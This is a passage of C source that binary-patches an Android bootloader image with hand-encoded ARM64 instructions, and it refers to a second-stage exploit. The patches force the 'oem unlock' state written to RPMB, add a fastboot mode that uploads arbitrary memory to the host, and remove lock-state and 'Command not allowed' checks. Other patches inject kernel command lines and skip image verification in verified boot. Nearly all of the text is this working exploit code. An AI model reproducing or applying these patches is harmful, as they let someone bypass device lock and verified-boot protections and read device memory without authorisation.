        OPCODE(ablcode + 0x2FB0C + 0x34, 0x83, 0xfe, 0xff, 0xb0);  // adrp  x3, #-0x2f000 = [ 83 fe ff b0 ]
        OPCODE(ablcode + 0x2FB0C + 0x38, 0xe0, 0x03, 0x00, 0x91);  // add   x0, sp, #0x00 = [ e0 03 00 91 ]         we have !!??0x198??!! bytes available on stack in "No such partition." handler
        OPCODE(ablcode + 0x2FB0C + 0x3c, 0x01, 0x03, 0x80, 0x52);  // mov   w1, #0x18 = [ 01 03 80 52 ]                     ^^^^^^^^^^^^^ TODO not checked at all for this target!
        OPCODE(ablcode + 0x2FB0C + 0x40, 0x82, 0x04, 0x00, 0xf0);  // adrp  x2, #0x93000 = [ 82 04 00 f0 ]          "%x/%x\n"@PAGE
        OPCODE(ablcode + 0x2FB0C + 0x44, 0xd3, 0xff, 0xff, 0x17);  // b     #-0xb4 = [ d3 ff ff 17 ]                continue in previously created hole at 0x2FA9C

        OPCODE(ablcode + 0x2FA9C + 0x00, 0x42, 0x9c, 0x21, 0x91);  // add   x2, x2, #0x867 = [ 42 9c 21 91 ]        "%x/%x\n"@POFF
        OPCODE(ablcode + 0x2FA9C + 0x04, 0x64, 0x1a, 0x00, 0xd1);  // sub   x4, x19, #0x06 = [ 64 1a 00 d1 ]        substract legth of "flash:" command
        OPCODE(ablcode + 0x2FA9C + 0x08, 0x8a, 0x49, 0xff, 0x97);  // bl    #-0x2d9d8 = [ 8a 49 ff 97 ]             snprintf
        OPCODE(ablcode + 0x2FA9C + 0x0c, 0xe0, 0x03, 0x00, 0x91);  // add   x0, sp, #0x00 = [ e0 03 00 91 ]
        OPCODE(ablcode + 0x2FA9C + 0x10, 0xe8, 0xff, 0xff, 0x17);  // b     #-0x60 = [ e8 ff ff 17 ]

        // patch debug logging verbosity check to always be the most verbose
//#if 0
  OPCODE(ablcode + 0x07D68 + 0x00, 0x00, 0x00, 0x80, 0x12);  // mov   w0, #-1 = [ 00 00 80 12 ]
        //OPCODE(ablcode + 0x07D68 + 0x00, 0xe0, 0x03, 0x1f, 0xaa);  // mov   x0, xzr = [ e0 03 1f aa ]
  OPCODE(ablcode + 0x07D68 + 0x04, 0xc0, 0x03, 0x5f, 0xd6);  // ret = [ c0 03 5f d6 ]
        *(uint8_t *)(ablcode + 0xB98EC) = 0xff;                    //                                               more debug logging maybe
        //*(uint8_t *)(ablcode + 0xB98EC) = 0xfe;                    //                                               more debug logging possibly with disabled asserts
        //*(uint8_t *)(ablcode + 0xB98EC) = 0x2e;                    //                                               just disable asserts (original value was 0x2f)
        //*(uint8_t *)(ablcode + 0xB98EC) = 0x00;                    //                                               disable debug logging for hopefully better stability
//#endif


        // patch the "oem unlock" command to directly set unlock state with 'X' for 0 (locked) or with 'Y' for 1 (unlocked)
        OPCODE(ablcode + 0x59128 + 0x00, 0x62, 0x06, 0x40, 0x39);  // ldrb  w2, [x19, #0x01] = [ 62 06 40 39 ]
        OPCODE(ablcode + 0x59128 + 0x04, 0x42, 0x60, 0x01, 0x51);  // sub   w2, w2, #0x58 = [ 42 60 01 51 ]         'X' or 'Y' aka "locked" or "unlocked"
        OPCODE(ablcode + 0x59128 + 0x08, 0x5f, 0x04, 0x00, 0x71);  // cmp   w2, #0x01 = [ 5f 04 00 71 ]
        OPCODE(ablcode + 0x59128 + 0x0c, 0x48, 0x02, 0x00, 0x54);  // b.hi  #0x48 = [ 48 02 00 54 ]
        OPCODE(ablcode + 0x59128 + 0x10, 0x61, 0x05, 0x00, 0xd0);  // adrp  x1, #0xae000 = [ 61 05 00 d0 ]          locate the struct with bootloader state flag (0x107CD8)
        OPCODE(ablcode + 0x59128 + 0x14, 0x21, 0x60, 0x33, 0x91);  // add   x1, x1, #0xcd8 = [ 21 60 33 91 ]
        OPCODE(ablcode + 0x59128 + 0x18, 0x22, 0x34, 0x00, 0x39);  // strb  w2, [x1, #13] = [ 22 34 00 39 ]         set the bootloader unlock state
        OPCODE(ablcode + 0x59128 + 0x1c, 0x02, 0x33, 0x81, 0x52);  // mov   w2, #0x998 = [ 02 33 81 52 ]
        OPCODE(ablcode + 0x59128 + 0x20, 0x20, 0x00, 0x80, 0x52);  // mov   w0, #0x01 = [ 20 00 80 52 ]
        OPCODE(ablcode + 0x59128 + 0x24, 0xf8, 0x1f, 0xff, 0x97);  // bl    #-0x38020 = [ f8 1f ff 97 ]             commit the changes to rpmb
        OPCODE(ablcode + 0x59128 + 0x28, 0x08, 0x00, 0x00, 0x14);  // b     #0x20 = [ 08 00 00 14 ]                 jump to "Device already unlocked"
        OPCODE(ablcode + 0x59178 + 0x00, 0x4f, 0x00, 0x00, 0x14);  // b     #0x13c = [ 4f 00 00 14 ]                with forced OKAY fastboot response

        OPCODE(ablcode + 0x317EC + 0x00, 0x61, 0x02, 0x00, 0x54);  // b.ne  #0x4c = [ 61 02 00 54 ]                 skip over few checks to get space for our code

        // patch "erase:" command to set download mode usb buffer address
        // "erase:0xhexaddr" for data from host to device (normal behavior of "download:" command)
        // "erase:0Xhexaddr" for data from device to host (upload behavior of "download:" command)
        OPCODE(ablcode + 0x31788 + 0x00, 0xc1, 0x02, 0x40, 0x39);  // ldrb  w1, [x22] = [ c1 02 40 39 ]
        OPCODE(ablcode + 0x31788 + 0x04, 0x3f, 0xc0, 0x00, 0x71);  // cmp   w1, #0x30 = [ 3f c0 00 71 ]             '0'
        OPCODE(ablcode + 0x31788 + 0x08, 0x41, 0x01, 0x00, 0x54);  // b.ne  #0x28 = [ 41 01 00 54 ]
        OPCODE(ablcode + 0x31788 + 0x0c, 0xc1, 0x06, 0x40, 0x39);  // ldrb  w1, [x22, #0x01] = [ c1 06 40 39 ]
        OPCODE(ablcode + 0x31788 + 0x10, 0x3f, 0x60, 0x01, 0x71);  // cmp   w1, #0x58 = [ 3f 60 01 71 ]             'X'
        OPCODE(ablcode + 0x31788 + 0x14, 0x62, 0x00, 0x80, 0x52);  // mov   w2, #0x03 = [ 62 00 80 52 ]             0x03 for the init state of upload mode
        OPCODE(ablcode + 0x31788 + 0x18, 0x42, 0x00, 0x9f, 0x1a);  // csel  w2, w2, wzr, eq = [ 42 00 9f 1a ]       set our flag to init upload (0x02) instead of download (0x00)
        OPCODE(ablcode + 0x31788 + 0x1c, 0xf5, 0x06, 0x00, 0xd0);  // adrp  x21, #0xde000 = [ f5 06 00 d0 ]         fastboot_download_mode_init_upload@PAGE (0x10FFE2)
        OPCODE(ablcode + 0x31788 + 0x20, 0xa2, 0x8a, 0x3f, 0x39);  // strb  w2, [x21, #0xfe2] = [ a2 8a 3f 39 ]     fastboot_download_mode_init_upload@POFF setup our new flag
        OPCODE(ablcode + 0x31788 + 0x24, 0xe0, 0x03, 0x16, 0xaa);  // mov   x0,x22 = [ e0 03 16 aa ]
        OPCODE(ablcode + 0x31788 + 0x28, 0x12, 0x55, 0xff, 0x97);  // bl    #-0x2abb8 = [ 12 55 ff 97 ]             convert string to integer
        OPCODE(ablcode + 0x31788 + 0x2c, 0x12, 0x00, 0x00, 0x14);  // b     #0x48 = [ 12 00 00 14 ]                 jump to 0x317FC skipping code that should not be patched

        OPCODE(ablcode + 0x317FC + 0x00, 0xa3, 0xb6, 0x43, 0xf9);  // ldr   x3, [x21, #0x768] = [ a3 b6 43 f9 ]     fastboot_download_512MB_buffer_ptr@POFF (0x10F768)
        OPCODE(ablcode + 0x317FC + 0x04, 0xa0, 0xb6, 0x03, 0xf9);  // str   x0, [x21, #0x768] = [ a0 b6 03 f9 ]     fastboot_download_512MB_buffer_ptr@POFF
        OPCODE(ablcode + 0x317FC + 0x08, 0xe0, 0x03, 0x01, 0x91);  // add   x0, sp, #0x40 = [ e0 03 01 91 ]
        OPCODE(ablcode + 0x317FC + 0x0c, 0x01, 0x08, 0x80, 0x52);  // mov   w1, #0x40 = [ 01 08 80 52 ]
        OPCODE(ablcode + 0x317FC + 0x10, 0xa2, 0x04, 0x00, 0xf0);  // adrp  x2, #0x97000 = [ a2 04 00 f0 ]          (" 0x%llx" + 1)@PAGE
        OPCODE(ablcode + 0x317FC + 0x14, 0x42, 0x0c, 0x05, 0x91);  // add   x2, x2, #0x143 = [ 42 0c 05 91 ]        (" 0x%llx" + 1)@POFF  (==0xC8142+1)
        OPCODE(ablcode + 0x317FC + 0x18, 0x2e, 0x42, 0xff, 0x97);  // bl    #-0x2f748 = [ 2e 42 ff 97 ]             snprintf (0x20CC)
        OPCODE(ablcode + 0x317FC + 0x1c, 0xe0, 0x03, 0x01, 0x91);  // add   x0, sp, #0x40 = [ e0 03 01 91 ]
        //OPCODE(ablcode + 0x317FC + 0x20, 0xca, 0xff, 0xff, 0x17);  // b     #-0xd8 = [ ca ff ff 17 ]                exit with fastboot FAIL with prev big usb buff addr
        //^^ the "b #-0xd8" instruction is already there


        // patch "Download Finished" to invalidate data cache of the whole region just transferred via "download" command
        // and also invalidate instruction cache
        OPCODE(ablcode + 0x2E130 + 0x00, 0xc0, 0x1e, 0x40, 0xf9);  // ldr   x0, [x22, #0x38] = [ c0 1e 40 f9 ]      fastboot_download_512MB_buffer_ptr  (0x10F768)
        OPCODE(ablcode + 0x2E130 + 0x04, 0x01, 0x00, 0x0c, 0x8b);  // add   x1, x0, x12 = [ 01 00 0c 8b ]
        OPCODE(ablcode + 0x2E130 + 0x08, 0xd4, 0x1f, 0x00, 0x94);  // bl    #0x7f50 = [ d4 1f 00 94 ]               0x36088

        //OPCODE(ablcode + 0x2E130 + 0x0c, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x2E130 + 0x0c, 0x00, 0x10, 0x00, 0x91);  // add   x0, x0, #0x04 = [ 00 10 00 91 ]

        OPCODE(ablcode + 0x2E130 + 0x10, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x2E130 + 0x14, 0xab, 0xff, 0xff, 0x54);  // b.lt  #-0x0c = [ ab ff ff 54 ]
        OPCODE(ablcode + 0x2E130 + 0x18, 0x71, 0xc0, 0x00, 0x94);  // bl    #0x301c4 = [ 71 c0 00 94 ]              0x5E30C
// 02E14C C1 04 00 90 21 60 30 91                 ADRL            X1, aDownloadFinish ; "Download Finished\n"



        OPCODE(ablcode + 0x3228C + 0x00, 0xe0, 0xca, 0x62, 0x39);  // ldrb  w0, [x23, #0x8b2] = [ e0 ca 62 39 ]     fastboot_download_mode_init_upload (0x10FFE2)
        OPCODE(ablcode + 0x3228C + 0x04, 0x21, 0x00, 0x80, 0x52);  // mov   w1, #0x01 = [ 21 00 80 52 ]
        OPCODE(ablcode + 0x3228C + 0x08, 0x1f, 0x00, 0x1f, 0x6b);  // cmp   w0, wzr = [ 1f 00 1f 6b ]               set mode to normal download (0x01) or our new upload (0x03)
        OPCODE(ablcode + 0x3228C + 0x0c, 0x20, 0x00, 0x80, 0x1a);  // csel  w0, w1, w0, eq = [ 20 00 80 1a ]        (value 0x03 have been set from "erase:0X" as a flag to init_upload)
        OPCODE(ablcode + 0x3228C + 0x10, 0xab, 0x06, 0x00, 0xd0);  // adrp  x11, #0xd6000 = [ ab 06 00 d0 ]         fastboot_download_mode_512MB_active@PAGE (0x108728)
        OPCODE(ablcode + 0x3228C + 0x14, 0x60, 0xa1, 0x1c, 0x39);  // strb  w0, [x11, #0x728] = [ 60 a1 1c 39 ]     fastboot_download_mode_512MB_active
        OPCODE(ablcode + 0x3228C + 0x18, 0xc0, 0x03, 0x00, 0x54);  // b.eq  #0x78 = [ c0 03 00 54 ]                 extend down here to clean data cache before starting upload

        OPCODE(ablcode + 0x3228C + 0x1c, 0xe0, 0x1e, 0x40, 0xf9);  // ldr   x0, [x23, #0x38] = [ e0 1e 40 f9 ]      fastboot_download_512MB_buffer_ptr (0x10F768)
        OPCODE(ablcode + 0x3228C + 0x20, 0x01, 0x00, 0x08, 0x8b);  // add   x1, x0, x8 = [ 01 00 08 8b ]            size of the transfer is in x8
        OPCODE(ablcode + 0x3228C + 0x24, 0x76, 0x0f, 0x00, 0x94);  // bl    #0x3dd8 = [ 76 0f 00 94 ]               clean data cache to push changes to ram (0x36088)

        //OPCODE(ablcode + 0x3228C + 0x28, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x3228C + 0x28, 0x00, 0x10, 0x00, 0x91);  // add   x0, x0, #0x04 = [ 00 10 00 91 ]

        OPCODE(ablcode + 0x3228C + 0x2c, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x3228C + 0x30, 0xab, 0xff, 0xff, 0x54);  // b.lt  #-0x0c = [ ab ff ff 54 ]
        OPCODE(ablcode + 0x3228C + 0x34, 0x17, 0x00, 0x00, 0x14);  // b     #0x5c = [ 17 00 00 14 ]                 continue to "upload" after syncing cache to memory

        OPCODE(ablcode + 0x32390 + 0x00, 0x1f, 0x20, 0x03, 0xd5);  // nop = [ 1f 20 03 d5 ]                         avoid the original set of download mode to 0x01 in cmd "download:"

        // instead of fixed value of 0x01 aka ENDPOINT_IN, switched to ENDPOINT_OUT if indicated by extended state in fastboot_download_mode_512MB_active
        // so it can be set via "erase:0x" OD "erase:0X" command to 0x81 aka ENDPOINT_OUT alternativ
        OPCODE(ablcode + 0x2E274 + 0x00, 0x2d, 0x10, 0x80, 0x52);  // mov   w13, #0x81 = [ 2d 10 80 52 ]
        OPCODE(ablcode + 0x2E274 + 0x04, 0xae, 0xa2, 0x5c, 0x39);  // ldrb   w14, [x21, #0x728] = [ ae a2 5c 39 ]   fastboot_download_mode_512MB_active (0x108728)
        OPCODE(ablcode + 0x2E274 + 0x08, 0xdf, 0x05, 0x00, 0x71);  // cmp   w14, #0x01 = [ df 05 00 71 ]
        OPCODE(ablcode + 0x2E274 + 0x0c, 0x00, 0x00, 0x8d, 0x9a);  // csel  x0, x0, x13, eq = [ 00 00 8d 9a ]
        OPCODE(ablcode + 0x2E274 + 0x10, 0x80, 0x02, 0x3f, 0xd6);  // blr   x20 = [ 80 02 3f d6 ]                   (orig inst from 0x2E274)
        OPCODE(ablcode + 0x2E274 + 0x14, 0x03, 0x00, 0x00, 0x14);  // b     #0x0c = [ 03 00 00 14 ]

        OPCODE(ablcode + 0x2CBB8 + 0x00, 0xcb, 0x0d, 0x00, 0x54);  // b.lt  #0x1b8 = [ cb 0d 00 54 ]                fix branch condition to reflect extended states in fastboot_download_mode_512MB_active

        // this is to reset fastboot_download_mode_512MB_active to zero right after download/upload finished before sending fastboot status
        OPCODE(ablcode + 0x2E154 + 0x00, 0xde, 0xff, 0xff, 0x17);  // b     #-0x88 = [ de ff ff 17 ]                jump after branch of following code
        OPCODE(ablcode + 0x2E0C8 + 0x00, 0x07, 0x00, 0x00, 0x14);  // b     #0x1c = [ 07 00 00 14 ]                 make some room for additional code
        OPCODE(ablcode + 0x2E0C8 + 0x04, 0xd5, 0x06, 0x00, 0xd0);  // adrp  x21, #0xda000 = [ d5 06 00 d0 ]         fastboot_download_mode_512MB_active@PAGE  (0x108728)
        OPCODE(ablcode + 0x2E0C8 + 0x08, 0xbf, 0xa2, 0x1c, 0x39);  // strb  wzr, [x21, #0x728] = [ bf a2 1c 39 ]    fastboot_download_mode_512MB_active = 0
        OPCODE(ablcode + 0x2E0C8 + 0x10, 0x00, 0x08, 0x80, 0x52);  // mov   w0, #0x40 = [ 00 08 80 52 ]             orig instruction from 0x2E154
        OPCODE(ablcode + 0x2E0C8 + 0x14, 0x20, 0x00, 0x00, 0x14);  // b     #0x80 = [ 20 00 00 14 ]                 jump back to continue


        // extend usb transfer state machine with states to handle upload in download command
        OPCODE(ablcode + 0x2CBA0 + 0x00, 0xa0, 0x09, 0x00, 0x54);  // b.eq  #0x134 = [ a0 09 00 54 ]                jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x2CCA8 + 0x00, 0x81, 0x00, 0x00, 0x54);  // b.ne  #0x10 = [ 81 00 00 54 ]                 go to check additional mode values if it is not the orig dnld

        OPCODE(ablcode + 0x2CCB8 + 0x00, 0x9f, 0x0e, 0x00, 0x71);  // cmp   w20, #0x03 = [ 9f 0e 00 71 ]            is this download switched to upload mode?
        OPCODE(ablcode + 0x2CCB8 + 0x04, 0xa1, 0x01, 0x00, 0x54);  // b.ne  #0x34 = [ a1 01 00 54 ]                 branch to check for upload continue machine state
        OPCODE(ablcode + 0x2CCB8 + 0x08, 0xa8, 0x0a, 0x00, 0x94);  // bl    #0x2aa0 = [ a8 0a 00 94 ]               get_fastboot_download_mode_512MB_buffer_ptr (0x2F760)
        OPCODE(ablcode + 0x2CCB8 + 0x0c, 0xe2, 0x03, 0x00, 0xaa);  // mov   x2, x0 = [ e2 03 00 aa ]
        OPCODE(ablcode + 0x2CCB8 + 0x10, 0x20, 0x10, 0x80, 0x52);  // mov   w0, 0x81 = [ 20 10 80 52 ]
        OPCODE(ablcode + 0x2CCB8 + 0x14, 0xb0, 0x00, 0x80, 0x52);  // mov   w16, #0x05 = [ b0 00 80 52 ]
        OPCODE(ablcode + 0x2CCB8 + 0x18, 0xe5, 0xff, 0xff, 0x17);  // b     #-0x6c = [ e5 ff ff 17 ]                continue to 0x2CC64 address with following code:

        OPCODE(ablcode + 0x2CC60 + 0x00, 0x07, 0x00, 0x00, 0x14);  // b     #0x1c = [ 07 00 00 14 ]                 jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x2CC60 + 0x04, 0xf1, 0x06, 0x00, 0x90);  // adrp  x17, #0xdc000 = [ f1 06 00 90 ]         fastboot_download_mode_512MB_active@PAGE (0x108728)
        OPCODE(ablcode + 0x2CC60 + 0x08, 0x30, 0xa2, 0x1c, 0x39);  // strb  w16, [x17, #0x728] = [ 30 a2 1c 39 ]    fastboot_download_mode_512MB_active = 0x05   i.e. upload started
        OPCODE(ablcode + 0x2CC60 + 0x0c, 0x55, 0x00, 0x00, 0x14);  // b     #0x154 = [ 55 00 00 14 ]                branch to the usb send function after set of endpoint, we use 0x81 instead

        OPCODE(ablcode + 0x2CCEC + 0x00, 0x40, 0x00, 0x00, 0x14);  // b     #0x100 = [ 40 00 00 14 ]                jump after the debug level check so we can use that for a patch
        OPCODE(ablcode + 0x2CCEC + 0x04, 0x9f, 0x16, 0x00, 0x71);  // cmp   w20, #0x05 = [ 9f 16 00 71 ]            is this download switched to upload mode, upload continue state?
        OPCODE(ablcode + 0x2CCEC + 0x08, 0xe1, 0x05, 0x00, 0x54);  // b.ne  #0xbc = [ e1 05 00 54 ]                 if not, branch to the setup of fastboot command usb receive mode default
        OPCODE(ablcode + 0x2CCEC + 0x0c, 0x9a, 0x0a, 0x00, 0x94);  // bl    #0x2a68 = [ 9a 0a 00 94 ]               get_fastboot_download_mode_512MB_buffer_ptr (0x2F760)
        OPCODE(ablcode + 0x2CCEC + 0x10, 0xe1, 0x03, 0x00, 0xaa);  // mov   x1, x0 = [ e1 03 00 aa ]
        OPCODE(ablcode + 0x2CCEC + 0x14, 0xe0, 0x0f, 0x40, 0xf9);  // ldr   x0, [sp, #0x18] = [ e0 0f 40 f9 ]
        OPCODE(ablcode + 0x2CCEC + 0x18, 0xe8, 0x04, 0x00, 0x94);  // bl    #0x13a0 = [ e8 04 00 94 ]               call "DataReady %d\n" / "Download Finished\n" function
        OPCODE(ablcode + 0x2CCEC + 0x1c, 0x1f, 0x00, 0x00, 0x14);  // b     #0x7c = [ 1f 00 00 14 ]                 jump to end of this function bellow returning zero status

        if (extended > 0) {
            OPCODE(ablcode + 0x31AF0, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Command not allowed" when handling 'boot' cmd

            // following not needed as we skip it already within the 2nd stage exploit
            //OPCODE(ablcode + 0x2FAC4, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Flashing is not allowed in Lock State" in 'flash' cmd
            //OPCODE(ablcode + 0x317B4, 0x1f, 0x20, 0x03, 0xd5);     // nop = [ 1f 20 03 d5 ]                         do not jump to "Erase is not allowed in Lock State" in 'erase' cmd
        }

        if (extended > 1) {
            if (cmdline[0] != '\0') {
                strcpy(ablcode, cmdline);
                OPCODE(ablcode + 0x0B9EC + 0x00, 0xa1, 0xff, 0xff, 0xb0); // adrp  x1, #-0xb000 = [ a1 ff ff b0 ]
                OPCODE(ablcode + 0x0B9EC + 0x04, 0xe0, 0x03, 0x14, 0xaa); // mov   x0, x20  = [ e0 03 14 aa ]
                OPCODE(ablcode + 0x0B9EC + 0x08, 0x69, 0xff, 0xff, 0x97); // bl    #-0x025c = [ 69 ff ff 97 ]
                OPCODE(ablcode + 0x0B9EC + 0x0c, 0x0c, 0x00, 0x00, 0x14); // b     #0x30 = [ 0c 00 00 14 ]
            }
            if (cmdlinex[0] != '\0') {
                strcpy(ablcode + 0x00800, cmdlinex);
                if (cmdline[0] != '\0')
                    OPCODE(ablcode + 0x0B9EC + 0x0c, 0x1f, 0x20, 0x03, 0xd5); // nop = [ 1f 20 03 d5 ]
                else
                    OPCODE(ablcode + 0x0B9EC + 0x00, 0x04, 0x00, 0x00, 0x14); // b     #0x10 = [ 04 00 00 14 ]
                OPCODE(ablcode + 0x0B9EC + 0x10, 0x1c, 0x07, 0x00, 0x90); // adrp  x19, #0xf2000 = [ 93 07 00 d0 ]
                OPCODE(ablcode + 0x0B9EC + 0x14, 0x9c, 0xd3, 0x43, 0xf9); // ldr   x19, [x19, #0x8f8] = [ 73 7e 44 f9 ]
                OPCODE(ablcode + 0x0B9EC + 0x18, 0x80, 0x43, 0x40, 0xf9); // ldr   x0, [x19, #0x80] = [ 60 42 40 f9 ]
                OPCODE(ablcode + 0x0B9EC + 0x1c, 0xa1, 0xff, 0xff, 0xf0); // adrp  x1, #-0xb000 = [ a1 ff ff b0 ]
                OPCODE(ablcode + 0x0B9EC + 0x20, 0x21, 0x00, 0x20, 0x91); // add   x1, x1, #0x800 = [ 21 00 20 91 ]
                OPCODE(ablcode + 0x0B9EC + 0x24, 0xf5, 0xb4, 0x00, 0x94); // bl    #0x35c2c = [ 0b d7 00 94 ]
                OPCODE(ablcode + 0x0B9EC + 0x28, 0x80, 0x43, 0x00, 0xf9); // str   x0, [x19, #0x80] = [ 60 42 00 f9 ]
                OPCODE(ablcode + 0x0B9EC + 0x2c, 0x2a, 0xfe, 0xff, 0x17); // b     #0x10 = [ 04 00 00 14 ]
            }

            OPCODE(ablcode + 0x3F734 + 0x00, 0xe0, 0x05, 0x00, 0x90); // adrp  x0, #0xbc000 = [ e0 05 00 90 ]       byte at 0xfbe0d is override_flag created in align space
            OPCODE(ablcode + 0x3F734 + 0x04, 0x00, 0x34, 0x78, 0x39); // ldrb  w0, [x0, #0xe0d] = [ 00 34 78 39 ]
            OPCODE(ablcode + 0x3F734 + 0x08, 0x60, 0x00, 0x00, 0x34); // cbz   w0, #0x0c = [ 60 00 00 34 ]
            OPCODE(ablcode + 0x3F734 + 0x0c, 0x00, 0x04, 0x00, 0x51); // sub   w0, w0, #0x01 = [ 00 04 00 51 ]
            OPCODE(ablcode + 0x3F734 + 0x10, 0x60, 0x42, 0x00, 0xb9); // str   w0, [x19, #0x40] = [ 60 42 00 b9 ]
            OPCODE(ablcode + 0x3F734 + 0x14, 0x06, 0x00, 0x00, 0x14); // b     #0x18 = [ 06 00 00 14 ]

            OPCODE(ablcode + 0x3E550 + 0x00, 0xfe, 0x03, 0x00, 0xaa); // mov   x30, x0 = [ fe 03 00 aa ]
            OPCODE(ablcode + 0x3E58C + 0x00, 0xe8, 0x05, 0x00, 0xb0); // adrp  x8, #0xbd000 = [ e8 05 00 b0 ]       byte at 0xfbe0e is override_flag created in align space
            OPCODE(ablcode + 0x3E58C + 0x04, 0x09, 0x39, 0x78, 0x39); // ldrb  w9, [x8, #0xe0e] = [ 09 39 78 39 ]
            OPCODE(ablcode + 0x3E58C + 0x08, 0x69, 0x00, 0x00, 0x34); // cbz   w9, #0x0c = [ 69 00 00 34 ]
            OPCODE(ablcode + 0x3E58C + 0x0c, 0x20, 0x05, 0x00, 0x51); // sub   w0, w9, #0x01 = [ 20 05 00 51 ]
            OPCODE(ablcode + 0x3E58C + 0x10, 0xc0, 0x7b, 0x00, 0xb9); // str   w0, [x30, #0x78] = [ c0 7b 00 b9 ]

            OPCODE(ablcode + 0x31DC0, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x2D2B4, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x01664, 0x1f, 0x20, 0x03, 0xd5);        // nop = [ 1f 20 03 d5 ]
            OPCODE(ablcode + 0x31D6C, 0xe0, 0x03, 0x1f, 0xaa);        // mov   x0, xzr = [ e0 03 1f aa ]

            OPCODE(ablcode + 0x01080 + 0x00, 0xb8, 0xb9, 0x00, 0x94); // bl    #0x2e6e0 = [ b8 b9 00 94 ]
            OPCODE(ablcode + 0x01080 + 0x04, 0xe8, 0xff, 0xff, 0xf0); // adrp  x8, #-0x1000 = [ e8 ff ff f0 ]
            OPCODE(ablcode + 0x01080 + 0x08, 0xc9, 0x07, 0x00, 0xd0); // adrp  x9, #0xFA000 = [ c9 07 00 d0 ]
            OPCODE(ablcode + 0x01080 + 0x0c, 0x28, 0x01, 0x08, 0xcb); // sub   x8, x9, x8 = [ 28 01 08 cb ]
            OPCODE(ablcode + 0x01080 + 0x10, 0x08, 0x00, 0x08, 0x8b); // add   x8, x0, x8 = [ 08 00 08 8b ]
            OPCODE(ablcode + 0x01080 + 0x14, 0x81, 0x08, 0x00, 0x90); // adrp  x1, #0x110000 = [ 81 08 00 90 ]
            OPCODE(ablcode + 0x01080 + 0x18, 0x00, 0x85, 0x40, 0xf8); // ldr   x0, [x8], #0x08 = [ 00 85 40 f8 ]
            OPCODE(ablcode + 0x01080 + 0x1c, 0x20, 0x85, 0x00, 0xf8); // str   x0, [x9], #0x08 = [ 20 85 00 f8 ]
            OPCODE(ablcode + 0x01080 + 0x20, 0x3f, 0x01, 0x01, 0xeb); // cmp   x9, x1 = [ 3f 01 01 eb ]
            OPCODE(ablcode + 0x01080 + 0x24, 0xa3, 0xff, 0xff, 0x54); // b.lo  #-0x0c = [ a3 ff ff 54 ]
            OPCODE(ablcode + 0x01080 + 0x28, 0xec, 0xff, 0xff, 0x17); // b     #-0x50 = [ ec ff ff 17 ]

            *(uint16_t *)(ablcode + 0xfbe0e) = override_flag;
        }

        OPCODE(ablcode + 0x647A4, 0xe8, 0x03, 0x1f, 0x2a);         // mov   w8, wzr = [ e8 03 1f 2a ]               do not log XReplace start
        OPCODE(ablcode + 0x648F0, 0xea, 0x03, 0x1f, 0x2a);         // mov   w10, wzr = [ ea 03 1f 2a ]              do not log XReplace end

        //OPCODE(ablcode + 0x02180, 0x00, 0x00, 0xc0, 0x94);         // bl #0x3000000 = [ 00 00 c0 94 ]
        //OPCODE(ablcode + 0x02180, 0x00, 0x00, 0xc0, 0x14);         // b  #0x3000000 = [ 00 00 c0 14 ]
        //OPCODE(ablcode + 0x04FB4, 0x13, 0x00, 0x00, 0x91);         // add   x19, x0, #0x00 = [ 13 00 00 91 ]
        //OPCODE(ablcode + 0x028F8, 0x1f, 0x20, 0x03, 0xd5);         // nop = [ 1f 20 03 d5 ]
        //OPCODE(ablcode + 0x0314C, 0x1f, 0x20, 0x03, 0xd5);         // nop = [ 1f 20 03 d5 ]

#if 0
        //OPCODE(ablcode + 0x02164, 0xea, 0x03, 0x00, 0x91);         // mov   x10, sp = [ ea 03 00 91 ]
        OPCODE(ablcode + 0x02164, 0x0a, 0x00, 0xb3, 0xd2);         // mov x10, #0x98000000 = [ 0a 00 b3 d2 ]
        //OPCODE(ablcode + 0x02164, 0x0a, 0x00, 0xb4, 0xd2);         // mov x10, #0xa0000000 = [ 0a 00 b4 d2 ]
        OPCODE(ablcode + 0x02170, 0x1f, 0x00, 0x0a, 0xeb);         // cmp   x0, x10 = [ 1f 00 0a eb ]
        //OPCODE(ablcode + 0x02170, 0x5f, 0x01, 0x00, 0xeb);         // cmp   x10, x0 = [ 5f 01 00 eb ]
        OPCODE(ablcode + 0x02174, 0x08, 0x01, 0x00, 0x54);         // b.hi  #0x20 = [ 08 01 00 54 ]
        OPCODE(ablcode + 0x02178, 0x00, 0x00, 0xc0, 0x14);         // b  #0x3000000 = [ 00 00 c0 14 ]
        OPCODE(ablcode + 0x021B0, 0x1f, 0x20, 0x03, 0xd5);         // nop = [ 1f 20 03 d5 ]
#endif

        if (extended > 2)
            p118_test8_patch(ablcode, 0, 0);

        OPCODE(ablcode + 0x31CA4, 0x1f, 0x20, 0x03, 0xd5);         // nop = [ 1f 20 03 d5 ]
        OPCODE(ablcode + 0x03764, 0xc0, 0x03, 0x5f, 0xd6);         // ret = [ c0 03 5f d6 ]

        OPCODE(ablcode + 0x36AB4, 0x00, 0x00, 0xc0, 0x14);         // b  #0x3000000 = [ 00 00 c0 14 ]
        OPCODE(ablcode + 0x58AF0 + 0x00, 0xe0, 0x03, 0x1f, 0xaa);  // mov   x0, xzr = [ e0 03 1f aa ]
        OPCODE(ablcode + 0x58AF0 + 0x04, 0xc0, 0x03, 0x5f, 0xd6);  // ret = [ c0 03 5f d6 ]
}

static const int p118_vb_size = 0xc000;

static void p118_test6_patch(unsigned char *vbcode, int size, int offset)
{
        OPCODE(vbcode + 0x2C98, 0x3d, 0x00, 0x00, 0x14);           // b     #0xf4 = [ 3d 00 00 14 ]          skip image verification in VerifiedBootDxe module with GREEN
